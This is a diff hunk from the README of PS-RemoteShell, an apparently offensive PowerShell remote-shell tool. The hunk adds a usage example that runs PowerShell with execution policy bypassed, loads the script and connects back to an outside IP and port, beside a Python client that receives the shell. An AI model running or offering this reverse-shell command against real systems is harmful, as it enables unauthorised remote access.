@@ -18,6 +18,10 @@ $ python PsShellClient.py 0.0.0.0 1111 test
 
 # Example
 ```
+powershell -exec bypass Import-Module .\PS-RemoteShell.ps1; PS-RemoteShell -ip 1.1.1.1 -port 1111 -key test
+```
+
+```
 $ python PsShellClient.py 10.0.0.144 8080 test
 PS-RemoteShell Python Client v1.0
 Mr.Un1k0d3r RingZer0 Team
